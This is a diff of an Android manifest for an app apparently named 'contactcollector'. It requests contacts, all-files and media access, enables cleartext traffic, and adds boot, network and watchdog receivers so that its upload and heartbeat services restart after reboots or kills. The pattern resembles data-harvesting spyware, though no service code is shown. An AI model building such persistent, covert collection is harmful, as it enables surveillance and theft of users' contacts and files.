@@ -1,7 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
-    package="com.contactcollector.app">
+    package="com.contactcollector.app"
+    android:versionCode="1"
+    android:versionName="1.0">
+
+    <uses-sdk
+        android:minSdkVersion="21"
+        android:targetSdkVersion="35" />
 
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.INTERNET" />
@@ -12,10 +18,16 @@
         android:maxSdkVersion="29" />
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
         tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
     <application
         android:allowBackup="false"
@@ -25,6 +37,8 @@
         android:supportsRtl="true"
         android:theme="@style/AppTheme"
         android:requestLegacyExternalStorage="true"
+        android:usesCleartextTraffic="true"
+        android:networkSecurityConfig="@xml/network_security_config"
         tools:targetApi="35">
 
         <activity
@@ -39,15 +53,59 @@
         </activity>
 
         <service
-            android:name=".FileUploadService"
-            android:foregroundServiceType="dataSync"
-            android:exported="false"
-            android:stopWithTask="false" />
-
-        <service
             android:name=".HeartbeatService"
             android:foregroundServiceType="dataSync"
             android:exported="false"
-            android:stopWithTask="false" />
+            android:stopWithTask="false"
+            android:enabled="true" />
+
+        <service
+            android:name=".FileUploadService"
+            android:foregroundServiceType="dataSync"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:enabled="true" />
+
+        <service
+            android:name=".WatchdogJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="true" />
+
+        <!-- Boot receiver - starts services when phone restarts -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true"
+            android:enabled="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Network state receiver - reconnects when network returns -->
+        <receiver
+            android:name=".NetworkStateReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Watchdog alarm receiver - periodic check every 5 minutes -->
+        <receiver
+            android:name=".WatchdogAlarmReceiver"
+            android:exported="false"
+            android:enabled="true" />
+
+        <!-- Service restart receiver - handles service restart after kill -->
+        <receiver
+            android:name=".ServiceRestartReceiver"
+            android:exported="false"
+            android:enabled="true" />
     </application>
 </manifest>
